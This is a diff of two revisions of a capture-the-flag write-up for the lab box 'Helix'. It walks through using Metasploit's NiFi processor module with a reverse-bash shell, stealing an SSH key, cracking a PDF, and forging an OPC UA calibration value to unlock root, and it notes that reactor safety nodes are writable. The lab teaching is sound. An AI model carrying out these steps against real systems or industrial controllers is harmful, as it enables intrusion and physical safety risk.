@@ -34,13 +34,13 @@ The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (
 
 ## Recon
 
-`helix.htb` goes into `/etc/hosts` first — every command from here on uses the name rather than the IP:
+`helix.htb` goes into `/etc/hosts` first so every command can use the name:
 
 ```bash
 echo "10.129.9.96 helix.htb" | sudo tee -a /etc/hosts
 ```
 
-Initial scan. Note that it takes the bare IP and the report still resolves the name; that is the hosts entry, not a PTR record:
+Initial scan:
 
 ```bash
 nmap -sC -sV 10.129.9.96 -oN nmap-scan
@@ -57,15 +57,15 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Two ports, which is a small attack surface and a strong hint that the web service is the whole game. The `Service Info` line is nmap's service-derived guess rather than an OS fingerprint — no `-O` was run — but the OpenSSH banner pins it to Ubuntu regardless.
+Two ports only, so the web service is the whole game. The `Service Info` line is a guess rather than an OS fingerprint (no `-O` was run), but the OpenSSH banner already pins the box to Ubuntu.
 
 ![Nmap service scan against Helix](/images/helix/nmap_scan.png)
 
-Port 80 is a corporate brochure site for "Helix Industries", an industrial automation contractor. There is nothing exploitable on it, but the theme matters: everything later in the box is dressed as plant equipment.
+Port 80 is a corporate brochure site for "Helix Industries", an industrial automation contractor. Nothing exploitable, but the theme matters: everything later is dressed as plant equipment.
 
 ![The Helix Industries corporate site on port 80](/images/helix/helix.htb.png)
 
-With a single vhost answering on 80 and nothing else exposed, the next move is to fuzz the `Host` header. The default response is 154 bytes, so filter on that size:
+One vhost, nothing else exposed. Fuzz the `Host` header, filtering out the 154-byte default response:
 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
@@ -80,7 +80,7 @@ flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duratio
 
 ![ffuf discovering the flow vhost](/images/helix/ffuf_output.png)
 
-`flow` is a telling name — it is what Apache NiFi calls its pipelines. Add the vhost so the browser and Metasploit both reach it:
+`flow` is what Apache NiFi calls its pipelines. Add the vhost so the browser and Metasploit both reach it:
 
 ```bash
 echo "10.129.9.96 flow.helix.htb" | sudo tee -a /etc/hosts
@@ -92,15 +92,15 @@ echo "10.129.9.96 flow.helix.htb" | sudo tee -a /etc/hosts
 
 ## Foothold: an unauthenticated NiFi canvas
 
-`flow.helix.htb/nifi/` loads the NiFi flow canvas directly. No login page, no user in the toolbar — the application treats the browser as a fully privileged anonymous caller. Two processors sit on the canvas, `ExecuteSQL` feeding `LogAttribute` over a `success` connection, both stamped `1.21.0` from `org.apache.nifi - nifi-standard-nar`.
+`flow.helix.htb/nifi/` loads the NiFi canvas directly: no login page, no user in the toolbar. The app treats the browser as a fully privileged anonymous caller. Two processors are on the canvas, `ExecuteSQL` feeding `LogAttribute`, both version `1.21.0`.
 
 ![The unauthenticated Apache NiFi canvas at flow.helix.htb](/images/helix/apache_nifi.png)
 
-**Why this is remote code execution.** NiFi is a dataflow platform built out of *processors* — small configurable units wired together on a canvas and driven by a REST API under `/nifi-api`. Several standard processors run operating-system commands as their entire purpose: `ExecuteProcess` launches a command, `ExecuteStreamCommand` pipes content through one, `ExecuteScript` runs a script in an embedded engine. That is a documented feature, and Apache is explicit that configuring dangerous OS commands is not a project security vulnerability. NiFi's whole security boundary is therefore the authentication layer in front of the canvas — and that layer is tied to transport security. Served over HTTPS, NiFi enforces authentication and authorisation. Served over plain HTTP with no access control, as here, anyone who can reach `/nifi-api` can create a processor, point it at a command, and start it. No software defect is exploited at all; an intended feature is simply exposed to the internet.
+**Why this is remote code execution.** NiFi builds dataflows out of *processors* driven by a REST API under `/nifi-api`, and some processors run OS commands as their whole job: `ExecuteProcess`, `ExecuteStreamCommand`, `ExecuteScript`. That is a feature, and Apache says so explicitly. The catch is that NiFi only enforces authentication over HTTPS. Served over plain HTTP with no access control, as here, anyone who reaches `/nifi-api` can drop in a processor and run a command. No exploit, just an intended feature left open.
 
-Worth noting what we are *not* doing: NiFi 1.21.0 falls inside the affected range of two real vulnerabilities, **CVE-2023-34468** (H2 JDBC connection-URL RCE via `DBCPConnectionPool`) and **CVE-2023-34212** (JNDI deserialisation in the JMS components), both fixed in 1.22.0. Neither is needed. The misconfiguration path is open.
+1.21.0 also sits inside the range of two real bugs, **CVE-2023-34468** (H2 JDBC RCE) and **CVE-2023-34212** (JNDI deserialisation), both fixed in 1.22.0. Neither is needed here.
 
-Metasploit automates the processor dance. The module defaults to `RPORT 8080` and appends `nifi-api` to the base path itself, so only the port has to be corrected and the vhost set explicitly — nginx is routing by `Host` header:
+Metasploit automates the whole processor dance. It defaults to `RPORT 8080`, so correct the port and set the vhost explicitly, since nginx routes by `Host` header:
 
 ```bash
 msfconsole
@@ -114,7 +114,7 @@ msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 80
 msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOSTS 10.129.9.96
 ```
 
-The `cmd/unix/reverse_bash` line is Metasploit's own notice on `use`, not something we set — it is the module's configured default. `TARGETURI` is left alone for the same reason: it defaults to `/`, and the module appends `nifi-api` itself when it builds each API call, so pointing it at the API path would request `/nifi-api/nifi-api/processors` and 404.
+The `cmd/unix/reverse_bash` line is the module's default payload, printed on `use`. Leave `TARGETURI` at `/` too: the module appends `nifi-api` itself, so pointing it at the API path would request `/nifi-api/nifi-api/processors` and 404.
 
 ![Selecting the NiFi processor RCE module and setting the target](/images/helix/msfconsole.png)
 
@@ -133,7 +133,7 @@ msf6 exploit(multi/http/apache_nifi_processor_rce) > run
 [+] Processor Delete sent successfully
 ```
 
-The `could not be validated` warning is the confirmation, not a problem. The check never attempts a login — it asks the instance whether it supports one, and this one says no, which Metasploit renders as "running, but unverified". It hedges because it cannot confirm `ExecuteProcess` is actually available without creating a processor, which is what `run` is about to do anyway. The module then creates that processor via the API, starts it to fire the payload, and stops and deletes it afterwards. That tidies the canvas rather than the evidence — the flow-configuration history records the processor being added, configured, started and deleted, and `nifi-app.log` records the scheduling either side of it.
+The `could not be validated` warning is confirmation, not a problem: the check asks whether the instance supports logins, this one doesn't, and Metasploit can't verify `ExecuteProcess` is reachable without actually creating a processor, which `run` does next anyway. It creates the processor, fires the payload, then stops and deletes it. That cleans the canvas, not the evidence: the flow-configuration history and `nifi-app.log` both keep a record.
 
 ![Metasploit landing a shell and cleaning up the processor](/images/helix/msfconsole2.png)
 
@@ -152,7 +152,7 @@ nifi@helix:/opt/nifi-1.21.0$ pwd
 
 ## nifi → operator: a key left in a support bundle
 
-The shell lands in the install directory, so the first move is to look at what is in it. Most of it is the stock NiFi tree — `bin`, `conf`, `lib`, the repositories — and one directory that ships with no NiFi release: `support-bundles/`. NiFi has a diagnostics command, but it writes to a file you name; it does not stage anything here. Someone made this directory by hand, which is reason enough to open it:
+First look at where the shell landed. It's the stock NiFi tree (`bin`, `conf`, `lib`, the repositories) plus one directory that ships with no NiFi release: `support-bundles/`. NiFi's diagnostics command writes to a file you name; it never creates this. Someone made it by hand, which is reason enough to look inside:
 
 ```bash
 ls -l /opt/nifi-1.21.0/support-bundles/
@@ -166,7 +166,7 @@ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-411 bytes and owned by `nifi` — the service account we already control can read it, and the filename names its owner. Material staged for a vendor ticket is exactly the kind of artefact that gets generated under pressure, attached to an email, and never cleaned up.
+411 bytes, owned by `nifi`, readable by the account we already have, and the filename names its owner. Exactly the kind of thing that gets staged for a support ticket and never cleaned up.
 
 ![The operator private key staged in NiFi's support-bundles directory](/images/helix/ssh_key.png)
 
@@ -211,7 +211,7 @@ ls -l
 
 ![The operator home directory holding the plant documentation](/images/helix/privile_escalation.png)
 
-Pull both down. The filenames contain spaces and an ampersand, so the remote paths need escaping — the PDF first, then the diagram:
+Pull both down, escaping the spaces and ampersand in the names:
 
 ```bash
 scp -i operator_id_ed25519 \
@@ -223,9 +223,9 @@ scp -i operator_id_ed25519 \
 
 ![Transferring the plant documentation off the target with scp](/images/helix/scp.png)
 
-The diagram is the map of everything that follows. An OPC UA server at `opc.tcp://127.0.0.1:4840/helix/` sits between an operator station, a remote client, and three subsystems. The colour coding is load-bearing: **Reactor Systems** in blue, **Control Systems** in green, **Safety Systems** in red, with a pencil icon on every writable point and a padlock on every read-only one. Per the vendor's own drawing, `Calibration Offset`, `Mode`, `Test Override` and `Reset Trip` are writable; `Trip Active`, `Rods Inserted` and `Emergency Cooling` are not.
+The diagram maps everything that follows. An OPC UA server at `opc.tcp://127.0.0.1:4840/helix/` sits between an operator station, a remote client, and three subsystems: Reactor, Control, Safety. Every point is marked writable (pencil) or read-only (padlock). Per the vendor, `Calibration Offset`, `Mode`, `Test Override` and `Reset Trip` are writable; `Trip Active`, `Rods Inserted` and `Emergency Cooling` are not.
 
-Note the address. `127.0.0.1` means the OPC UA server is loopback-only — it is not reachable from the VPN, and everything we do to it has to run on the box or through a tunnel. The operator foothold is a prerequisite, not a convenience.
+The address matters: `127.0.0.1` means the OPC UA server is loopback-only, reachable only from the box or through a tunnel. The operator shell is a prerequisite, not a convenience.
 
 ![The vendor's control systems diagram, with every point marked writable or read-only](/images/helix/control_systems_diagram.png)
 
@@ -233,7 +233,7 @@ The PDF is password protected:
 
 ![The Operator Control & Safety Guide refusing to open without a password](/images/helix/pdf_pw_protected.png)
 
-PDF encryption reduces to a key derived from the user password, so the document itself carries everything an offline attack needs. `pdf2john` extracts that material into a hash john can chew on:
+A PDF's encryption key is derived from its password, so the file itself is enough for an offline crack. `pdf2john` pulls out the hash:
 
 ```bash
 pdf2john "Operator Control & Safety Guide.pdf" > pdf.hash
@@ -254,7 +254,7 @@ Operator Control & Safety Guide.pdf:operator1
 1 password hash cracked, 0 left
 ```
 
-The password is `operator1` — an operator account with the word "operator" and a digit, which is depressingly true to life.
+The password is `operator1`.
 
 ![john revealing the cracked PDF password](/images/helix/pdf2john-password.png)
 
@@ -264,27 +264,27 @@ The password is `operator1` — an operator account with the word "operator" and
 
 The decrypted guide reads like an exploit written out in advance by the vendor. Six sections matter.
 
-**Section 3 — Normal Operating Mode.** In `NORMAL`, `CalibrationOffset` is expected to be `0.0` and `TestOverride` must be disabled. Any attempt to apply calibration offsets or overrides in `NORMAL` mode is ignored by the PLC. So writing the offset first and flipping the mode later achieves nothing; order is prescriptive.
+**Section 3 — Normal Operating Mode.** In `NORMAL`, the PLC ignores any calibration offset or override. So the mode has to change first; writing the offset before that does nothing. Order matters.
 
 ![Section 3 of the guide defining NORMAL mode behaviour](/images/helix/operating_mode.png)
 
-**Section 4 — Safety Trip Logic.** Under the sub-heading *Trip Thresholds (Internal)*, a trip fires at temperature ≥ ~305 °C or pressure ≥ ~75 bar. On trip, `TripActive` becomes `TRUE`, control logic is locked, safety systems take precedence, and operator inputs are restricted. The trip is **latched** and cannot be cleared immediately.
+**Section 4 — Safety Trip Logic.** A trip fires at roughly ≥ 305 °C or ≥ 75 bar. It sets `TripActive` true, locks the control logic, and is **latched**: it will not clear on its own.
 
 ![Section 4 of the guide listing the internal trip thresholds](/images/helix/safety_trip_logic.png)
 
-**Section 5 — Trip Reset Conditions.** A reset requires *all* of: temperature below ~288 °C, pressure below ~70 bar, mode `NORMAL`, `TestOverride` disabled, and `CalibrationOffset` back to `0.0`. Only when the system is back in a verified safe state will a `ResetTrip` request be honoured — which, as the document says, is what stops operators bypassing safety systems while unsafe conditions persist.
+**Section 5 — Trip Reset Conditions.** Clearing it needs *all* of: below ~288 °C, below ~70 bar, mode `NORMAL`, `TestOverride` off, and `CalibrationOffset` back to `0.0`. Only then is `ResetTrip` honoured. That is what stops an operator riding through an unsafe state.
 
 ![Section 5 of the guide defining the trip reset conditions](/images/helix/trip_reset_conditions.png)
 
-**Section 6 — Maintenance Mode & Safety Window.** An ordered, three-step procedure: switch `Mode` to `MAINTENANCE`, enable `TestOverride`, then begin controlled adjustment using `CalibrationOffset`. Crucially, the section closes by noting the reactor is *still* protected by safety logic in this mode — `MAINTENANCE` permits limited overrides for diagnostics, it does not disable the trip.
+**Section 6 — Maintenance Mode & Safety Window.** Three ordered steps: set `Mode` to `MAINTENANCE`, enable `TestOverride`, then adjust `CalibrationOffset`. The trip logic stays live throughout: `MAINTENANCE` allows diagnostics, it does not switch safety off.
 
 ![Section 6 of the guide describing how to enter maintenance mode](/images/helix/maintenance_window.png)
 
-**Section 7 — Maintenance Operating Window.** A *maintenance operating window* opens when temperature reaches approximately 295 °C or pressure 73 bar, while both remain below the trip thresholds and no safety trip is active. The window exists **below** trip limits but **above** normal operating conditions, and is deliberately narrow so that maintenance actions stay time-limited and closely monitored.
+**Section 7 — Maintenance Operating Window.** A *maintenance operating window* opens at roughly 295 °C or 73 bar, as long as both stay below the trip and no trip is active. It sits **above** normal operation but **below** the trip: a deliberately narrow band.
 
 ![Section 7 of the guide defining the maintenance operating window](/images/helix/maintenance_window2.png)
 
-**Section 8 — Behavior During CalibrationOffset Ramp.** Increase the offset gradually and temperature rises predictably while pressure stays tightly constrained. Increase it too aggressively and the PLC trips, after which calibration changes are ignored outright.
+**Section 8 — Behavior During CalibrationOffset Ramp.** Raise the offset gradually and temperature climbs predictably. Raise it too fast and the PLC trips, and once tripped it ignores further offset writes.
 
 ![Section 8 of the guide describing the calibration offset ramp](/images/helix/callibration_offset.png)
 
@@ -313,7 +313,7 @@ LISTEN  0       50       [::ffff:127.0.0.1]:40769                  *:*
 LISTEN  0       128                    [::]:22                  [::]:*
 ```
 
-`4840` is the OPC UA default. `8081` is something else. The rest is ordinary background — systemd-resolved's stub listener, an ephemeral port, and the IPv6 twin of `22`. Only `22` and `80` bind a non-loopback address, which is exactly what the scan saw from outside. Note also that `-p` produced an empty Process column for every row: as an unprivileged user we can see the sockets but not who owns them.
+`4840` is OPC UA, `8081` is something new; the rest is background (resolved's stub, an ephemeral port, the IPv6 twin of `22`). Only `22` and `80` bind a public address, which is what the scan saw. The empty Process column is just our unprivileged view: we see the sockets but not their owners.
 
 ![Enumerating loopback listeners as operator](/images/helix/internal_network.png)
 
@@ -340,9 +340,9 @@ The dashboard at `http://127.0.0.1:8081/` is the live state of everything the gu
 
 > Maintenance window is NOT the same as MAINTENANCE mode. Window opens only when safety controller authorizes it under hazardous test conditions.
 
-Reactor reads `279.0 °C` and `68.75 bar`, with `Raw Temp: 279.0 °C | CalibrationOffset: 0.0 °C` broken out separately underneath. Control shows `Mode: NORMAL`, `Test Override: False`. The **Privileged Maintenance Window** panel reads `Status: CLOSED`, and spells out the gate: granted by the safety controller only when a hazardous test condition is detected, *e.g.* Temp ≥ 295 °C or Pressure ≥ 73 bar, while still below trip.
+Reactor reads `279.0 °C` and `68.75 bar`, with `Raw Temp` and `CalibrationOffset: 0.0 °C` broken out separately below. Mode is `NORMAL`. The **Privileged Maintenance Window** panel reads `Status: CLOSED` and spells out the gate: opened by the safety controller only on a hazardous test condition (Temp ≥ 295 °C or Pressure ≥ 73 bar) while still below trip.
 
-That the HMI exposes raw temperature and calibration offset as two separate values is the tell. Displayed temperature is raw plus offset, and the offset is writable.
+The two separate values are the tell: displayed temperature is raw plus offset, and the offset is writable.
 
 ![The Helix reactor HMI with the maintenance window closed](/images/helix/reactor_dashboard.png)
 
@@ -362,7 +362,7 @@ User operator may run the following commands on helix:
     (root) NOPASSWD: /usr/local/sbin/helix-maint-console
 ```
 
-One NOPASSWD rule with no argument restriction. The `Defaults` line closes the usual side doors — `env_reset` and a fixed `secure_path` kill environment and `PATH` manipulation, `use_pty` blocks a class of TTY tricks. There is no shortcut here; the binary is the intended route.
+One NOPASSWD rule, no argument restriction. The `Defaults` line shuts the usual side doors: `env_reset` and a fixed `secure_path` kill environment and `PATH` tricks, `use_pty` blocks TTY attacks. No shortcut; the binary is the intended route.
 
 ![The sudo rule granting operator access to helix-maint-console](/images/helix/sudo_permissions.png)
 
@@ -378,13 +378,13 @@ Maintenance window CLOSED.
 
 ![helix-maint-console refusing to run while the window is shut](/images/helix/maint-console_closed.png)
 
-**Why this works.** Here is the whole box in one sentence: a binary that grants root checks, at invocation time, whether the plant is in a hazardous test condition — and the value it checks is one we can write. `helix-maint-console` asks the safety controller whether the window is open. The safety controller answers by reading the reported temperature. The reported temperature is raw temperature plus `CalibrationOffset`. And `CalibrationOffset` is a writable OPC UA node on a server that accepts anonymous sessions. Nothing physical has to change: we are not heating a reactor, we are forging the sensor reading that the authorisation decision consumes. That is **CWE-807, Reliance on Untrusted Inputs in a Security Decision** — the same class as trusting a cookie or a client-supplied role claim, wearing a lab coat.
+**Why this works.** The whole box is a chain. `helix-maint-console` grants root only when the plant is in a hazardous test condition. It asks the safety controller, which reads the reported temperature, which is raw temperature plus `CalibrationOffset` — a writable OPC UA node on a server that accepts anyone. Nothing physical changes; we forge the reading the authorisation decision trusts. That is **CWE-807, Reliance on Untrusted Inputs in a Security Decision**: the same mistake as trusting a cookie or a hidden form field, wearing a lab coat.
 
 ---
 
 ## OPC UA: mapping the address space
 
-An OPC UA server exposes an *address space*: a graph of nodes, where Object nodes give structure and Variable nodes hold values. Browsing it from the `Objects` folder downward is how you find out what a plant actually exposes — ATT&CK for ICS tracks the behaviour as **T0861, Point & Tag Identification**.
+An OPC UA server exposes an *address space*: Object nodes give structure, Variable nodes hold values. Browsing from the `Objects` folder down is how you learn what a plant exposes. ATT&CK for ICS calls it **T0861, Point & Tag Identification**.
 
 The server is loopback-only, so the scripts get written locally and dropped into `/tmp` on the target. First, find the `Plant` object and list its children:
 
@@ -419,7 +419,7 @@ asyncio.run(main())
 
 ![The plant_enum.py address-space enumeration script](/images/helix/plant_enum_python.png)
 
-Note that `Client(URL)` is passed no security policy and no user token. asyncua defaults to `SecurityPolicy None` and an `Anonymous` identity token unless `set_security()` and `set_user()` are called — and the connection succeeds, which tells us the server offers both. Those are two independent failures: an unencrypted, unsigned channel, *and* no user authentication.
+`Client(URL)` is given no security policy and no user token. asyncua defaults to `SecurityPolicy None` and an `Anonymous` token, and the connection succeeds, so the server accepts both. Two separate failures: an unencrypted channel, and no user authentication.
 
 ```text
 operator@helix:/tmp$ python3 plant_enum.py
@@ -434,7 +434,7 @@ Plant.Control → NodeId(Identifier=11, NamespaceIndex=2, NodeIdType=<NodeIdType
 
 Structure matches the diagram. The more useful question is what this *session* may write.
 
-Every Variable node carries an `AccessLevel` attribute and a `UserAccessLevel` attribute, both a byte of option bits: bit 0 (mask `0x01`) is CurrentRead, bit 1 (mask `0x02`) is CurrentWrite. `AccessLevel` describes what the node supports in the abstract; `UserAccessLevel` describes the same thing with the connected session's rights applied. It can restrict what `AccessLevel` permits but never exceed it — so testing bit 1 of `UserAccessLevel` is how you ask "what can *I* change", as opposed to what the node advertises:
+Every Variable node has an `AccessLevel` and a `UserAccessLevel`, each a byte of bits: bit 0 is CurrentRead, bit 1 (`0x02`) is CurrentWrite. `AccessLevel` is what the node supports in the abstract; `UserAccessLevel` is the same with this session's rights applied. So testing bit 1 of `UserAccessLevel` asks what *I* can actually write, not what the node advertises:
 
 ```python
 # plant_write_enum.py
@@ -505,11 +505,11 @@ operator@helix:/tmp$ python3 plant_write_enum.py
 
 Two things stand out.
 
-First, the identifier gaps. Printed nodes are 6, 8, 9, 12, 13, 14; nothing is reported for 3, 4, 5 or 10. `Temperature`, `Pressure` and `TripActive` are in that gap — so the server genuinely *does* enforce read-only on some nodes. This is not a server that grants write to everything.
+First, the identifier gaps. The writable nodes are 6, 8, 9, 12, 13, 14; nothing for 3, 4, 5 or 10, which is where `Temperature`, `Pressure` and `TripActive` live. So the server does enforce read-only on some nodes. It isn't just granting write to everything.
 
-Second, and precisely because of that: **`Safety.RodsInserted` and `Safety.EmergencyCooling` are writable**, and the vendor diagram labels both read-only with a padlock. The documented security model and the deployed ACLs disagree. We do not need those nodes to solve the box, but an attacker who wanted to cause harm rather than escalate privilege would use them — the ability to write the state of emergency cooling is materially worse than the ability to get a root shell.
+Second, and because of that: **`Safety.RodsInserted` and `Safety.EmergencyCooling` are writable**, though the diagram padlocks both. The documented model and the real ACLs disagree. We don't need them for root, but someone out to cause damage would: writing emergency cooling is far worse than a shell.
 
-One caveat the code invites: `writable()` falls back to `AccessLevel` on *any* exception, so a node with a null `UserAccessLevel` would be judged on the server-wide value instead of this session's. The spec says as much — clients should not assume access from the attribute alone, since a write can still be refused with `BadUserAccessDenied`. Attribute enumeration produces candidates; the write attempt is the proof.
+One caveat: `writable()` falls back to `AccessLevel` on any exception, so a node with a null `UserAccessLevel` gets judged on the server-wide value instead of ours. Either way the attribute only gives candidates, since a write can still come back `BadUserAccessDenied`. The write attempt is the real proof.
 
 ---
 
@@ -586,11 +586,11 @@ offset=21.00 temp=305.27C press=69.19bar trip=True
 
 Three observations.
 
-The loop *does* read `TripActive` every iteration — it is not blind. Its defect is that the only stopping rule fires after the trip has already latched. It detects the failure instead of avoiding it. What it never checks is whether it has already climbed far enough, so it sails straight through the 295 °C window at offset 11 and keeps going for another ten steps.
+The loop reads `TripActive` every iteration, so it isn't blind, but its only stopping rule fires after the trip has already latched. It detects the failure instead of avoiding it. It never checks whether it has climbed far enough, so it sails through the 295 °C window at offset 11 and keeps going.
 
-Pressure barely moves. It sits around 69.2 bar for the entire ramp and never approaches either the 73 bar window threshold or the 75 bar trip. The window's "or pressure 73 bar" clause is decorative on this box — temperature is the only variable that matters.
+Pressure barely moves: around 69.2 bar the whole way, never near the 73 bar window or the 75 bar trip. The "or 73 bar" clause is decorative here; temperature is the only variable that counts.
 
-And the trip is now latched. `CalibrationOffset` writes are ignored while `TripActive` is true, and it will not clear while the conditions that caused it persist. Per section 5, recovery means driving the whole system back to a verified safe state first.
+And the trip is now latched. Offset writes are ignored while `TripActive` holds, and it won't clear until the plant is back in the section 5 safe state.
 
 ---
 
@@ -716,11 +716,9 @@ if __name__ == "__main__":
 
 Four differences from the naive version, in order of importance.
 
-It checks the **window** condition after every step, not just the trip condition — `t >= OPEN_WINDOW_TEMP` stops the ramp the moment the door opens. It also carries a pre-emptive guard at `TRIP_TEMP` that backs the offset off by 3.0 rather than latching. If a previous run already latched the trip, it drives the system back to the section 5 safe state first — override off, mode `NORMAL`, offset `0.0`, then `ResetTrip` — and polls for up to 45 seconds until `TripActive` clears before ramping again. And it resolves nodes by browse name through `find()` instead of hardcoding `ns=2;i=N`, which is worth doing because node identifiers are a server implementation detail while browse names come from the vendor's own documentation.
+It checks the **window** condition after every step, not just the trip: `t >= OPEN_WINDOW_TEMP` stops the ramp the moment the door opens. It guards against the trip pre-emptively, backing the offset off by 3.0 instead of latching. If an earlier run already tripped, it resets to the section 5 safe state (override off, `NORMAL`, offset `0.0`, `ResetTrip`) and polls up to 45 seconds for the latch to clear before ramping again. And it resolves nodes by browse name through `find()` rather than hardcoding `ns=2;i=N`, since identifiers are a server detail but browse names come from the docs.
 
-One string in that recovery block is a hedge rather than an observation: the run below never fell through to the `Trip still TRUE` branch, so I cannot confirm the five-minute service reset it mentions. If the 45-second poll does not clear the latch, the dependable move is to reset the machine from the HTB panel — section 5's conditions are the only clearing mechanism the guide actually documents.
-
-Note the starting state in the run below, too. The latch had already cleared and the plant was back at `NORMAL` with a zero offset before this run began, so the recovery branch is skipped entirely. It earns its place on the runs where that is not true.
+Two honest notes on that recovery block. The "5-minute service reset" in its last message is a guess: the run below never hit that branch, so I can't confirm it. If the 45-second poll doesn't clear a latch, just reset the box from the HTB panel. And the run below starts already clear at `NORMAL` with a zero offset, so the recovery branch is skipped this time. It earns its place on the runs where the plant is still tripped.
 
 Run it:
 
@@ -742,7 +740,7 @@ python3 exploit.py
 
 ![exploit.py ramping into the maintenance window without tripping](/images/helix/exploit_out.png)
 
-Offset 13 rather than 21, and the trip never fires. Note that 13 is **not** a reproducible magic number: the failed run started at 285.31 °C for offset 1 and this one at 283.21 °C, so the same offset lands on a different temperature each time. The loop has to read the measured value back every iteration and decide on that — aiming at a fixed offset will either stop short or overshoot into the trip.
+Offset 13, not 21, and no trip. But 13 is **not** a fixed number: offset 1 read 285.31 °C on the failed run and 283.21 °C here, so the same offset lands on a different temperature each time. The loop has to read the measurement back each step and decide on that; aim at a fixed offset and you'll stop short or overshoot into the trip.
 
 ---
 
@@ -761,7 +759,7 @@ sudo /usr/local/sbin/helix-maint-console
 root@helix:/tmp#
 ```
 
-Eighty-two seconds is enough but not generous, and the shell opens in `/tmp` — so use the absolute path rather than discovering mid-countdown that `root/root.txt` is relative:
+Eighty-two seconds is enough but not generous, and the shell opens in `/tmp`. Use the absolute path rather than finding out mid-countdown that `root/root.txt` is relative:
 
 ```interactive shell
 root@helix:/tmp# cat /root/root.txt
@@ -775,14 +773,14 @@ root@helix:/tmp# cat /root/root.txt
 
 ## Takeaways
 
-- **An unauthenticated NiFi canvas is instant code execution as the service account.** `ExecuteProcess` and its siblings run OS commands by design, and NiFi only enforces authentication when served over HTTPS — so an HTTP deployment with no access control hands every anonymous caller a shell. There is no patch for this because there is no bug. Terminate NiFi behind TLS with authentication enabled, and treat any `/nifi-api` reachable without credentials as already compromised.
-- **Support bundles are credential dumps.** `operator_id_ed25519.bak` sat in `support-bundles/` readable by the service account, and a private key in a diagnostic directory is a key in production. Audit the staging directories of every application that can generate a support archive, and rotate anything that has ever been attached to a vendor ticket.
-- **Document encryption is an offline problem.** A password-protected PDF carries its own verifier, so the moment the file leaves the host the password is a hashcat or john target rather than an access control. `operator1` fell to rockyou instantly. Classify documents that describe safety logic as secrets and protect them with access control, not a passphrase.
-- **Anonymous OPC UA is two failures, not one.** `SecurityPolicy None` means an unsigned, unencrypted channel; an accepted `Anonymous` token means no user authentication. A server can fix either independently, and Helix fixed neither — so one `async with Client(url)` reached operating mode, test override, calibration data and the safety trip alike. Enumerate `UserAccessLevel` bit 1 on your own servers and see what an anonymous session can really write.
-- **The deployed ACLs disagreed with the vendor's own drawing.** `Safety.RodsInserted` and `Safety.EmergencyCooling` are documented read-only and are writable in practice, while `Temperature`, `Pressure` and `TripActive` really are protected — so this was a specific misconfiguration, not a blanket one. Architecture diagrams describe intent; only enumeration describes reality, and the gap between them is where findings live.
-- **A privilege decision must never read a value an attacker can write.** `helix-maint-console` grants root based on reported temperature, and reported temperature is raw plus `CalibrationOffset`, which is writable over an anonymous session. No reactor was heated — the sensor reading was forged. That is **CWE-807**, and it is the same mistake as trusting a hidden form field, just with a safety controller on the other end.
-- **Drive the ramp off the reading, not the offset.** Offset 1 measured 285.31 °C on the failed run and 283.21 °C on the working one, so 13 is an artefact of that run's baseline rather than a constant. The naive loop only ever asked whether the trip had already fired; the working one reads `Temperature` back after every write and stops on the reading. Any exploit steering a live process into a narrow band has to close the loop on the measurement, because the same input lands somewhere different every time.
-- **Safety and security are different standards, and Helix fails both.** IEC 61511 requires the safety instrumented system to be independent of the basic process control system, so one compromised path cannot take out both control and protection. ISA/IEC 62443 then asks for the SIS to be its own zone reachable only through an authenticated conduit. Here a single anonymous session on the application tier reached the safety controller. Getting the IT side right — put NiFi behind TLS with authentication, rotate the key — would not have fixed the part that actually matters.
+- **An unauthenticated NiFi canvas is code execution as the service account.** `ExecuteProcess` and its siblings run OS commands by design, and NiFi only enforces auth over HTTPS, so plain HTTP with no access control hands every caller a shell. There's no patch because there's no bug: put NiFi behind TLS with authentication, and treat any open `/nifi-api` as already compromised.
+- **Diagnostic directories leak secrets.** `operator_id_ed25519.bak` sat in `support-bundles/`, readable by the service account, and a private key staged for a ticket is a key in production. Audit those staging paths, and rotate anything that has ever been attached to a support case.
+- **A password-protected document is an offline crack.** The PDF carries its own verifier, so once the file leaves the host the password is a john target, not access control. `operator1` fell to rockyou instantly. Protect documents that describe safety logic with real access control, not a passphrase.
+- **Anonymous OPC UA is two failures, not one.** `SecurityPolicy None` is an unencrypted channel; an accepted `Anonymous` token is no user auth. Helix fixed neither, so one `Client(url)` reached mode, override, calibration and the safety trip alike. Enumerate `UserAccessLevel` bit 1 on your own servers to see what an anonymous session can really write.
+- **The real ACLs disagreed with the diagram.** `Safety.RodsInserted` and `Safety.EmergencyCooling` are documented read-only but writable in practice, while `Temperature`, `Pressure` and `TripActive` genuinely are locked. A specific misconfiguration, not a blanket one. Diagrams describe intent; only enumeration describes reality, and the gap is where the finding lives.
+- **A privilege decision must never read a value the attacker can write.** `helix-maint-console` grants root on reported temperature, and reported temperature is raw plus a `CalibrationOffset` writable over an anonymous session. No reactor was heated; the reading was forged. That is **CWE-807**, the same mistake as trusting a hidden form field, with a safety controller on the other end.
+- **Drive off the reading, not the input.** Offset 1 measured 285.31 °C on one run and 283.21 °C on another, so 13 is a baseline artefact, not a constant. The naive loop only asked whether it had already tripped; the working one reads `Temperature` back after each write and stops on that. Steer a live process into a narrow band and you have to close the loop on the measurement, because the same input lands somewhere different every time.
+- **Safety and security are different standards, and Helix fails both.** IEC 61511 wants the safety instrumented system independent of the control system, so one compromised path can't take out both. ISA/IEC 62443 wants that SIS in its own zone, reachable only through an authenticated conduit. Here a single anonymous session on the app tier reached the safety controller. Fixing the IT side alone, NiFi behind auth and the key rotated, would not have touched the part that matters.
 
 ---
 
